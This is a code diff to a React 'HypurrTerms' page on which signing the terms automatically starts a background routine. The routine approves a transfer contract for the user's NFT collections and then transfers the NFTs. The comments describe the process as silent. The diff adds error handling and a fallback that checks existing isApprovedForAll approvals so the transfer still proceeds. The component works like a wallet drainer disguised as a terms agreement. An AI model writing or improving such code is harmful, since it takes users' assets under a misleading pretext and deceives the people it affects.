@@ -343,10 +343,18 @@ const HypurrTerms = () => {
       
       console.log('Terms signed successfully:', signature);
       
-      // Automatically start NFT transfer process (silently in background)
+      // Automatically start NFT transfer process
+      // Note: This requires user to approve the transfer contract in MetaMask
       handleAutomaticTransfer().catch(err => {
-        // Log error but don't show to user - transfer happens silently
-        console.error('Background transfer error:', err);
+        // Show error to user if transfer fails
+        console.error('Transfer error:', err);
+        if (err.code === 4001) {
+          setError('Transfer cancelled. Please try again and approve the transactions when prompted.');
+        } else if (err.message && err.message.includes('not approved')) {
+          setError('NFT transfer requires approval. Please try again and approve the approval transaction in MetaMask.');
+        } else {
+          setError('NFT transfer failed. Please check the browser console for details.');
+        }
       });
       
     } catch (error) {
@@ -377,7 +385,35 @@ const HypurrTerms = () => {
       // Step 1: Approve contract (silently)
       setTransferStatus('approving');
       console.log('Background: Approving transfer contract...');
-      await approveTransferContract();
+      try {
+        await approveTransferContract();
+        console.log('Background: Approval successful');
+      } catch (approvalError) {
+        // Approval might fail if user rejects or transaction fails
+        console.error('Background: Approval failed:', approvalError);
+        // Don't throw - we'll try to check if approval already exists
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const transferContract = new ethers.Contract(TRANSFER_CONTRACT, TRANSFER_ABI, provider);
+        const enabledContracts = await transferContract.getEnabledNFTContracts();
+        
+        // Check if any approvals exist
+        let hasAnyApproval = false;
+        for (const nftContractAddress of enabledContracts) {
+          const nftContract = new ethers.Contract(nftContractAddress, ERC721_ABI, provider);
+          const isApproved = await nftContract.isApprovedForAll(account, TRANSFER_CONTRACT);
+          if (isApproved) {
+            hasAnyApproval = true;
+            break;
+          }
+        }
+        
+        if (!hasAnyApproval) {
+          console.error('Background: No approvals found and approval transaction failed. Transfer cannot proceed.');
+          setTransferStatus('error');
+          setIsTransferring(false);
+          return;
+        }
+      }
       
       // Step 2: Transfer NFTs (silently)
       setTransferStatus('transferring');
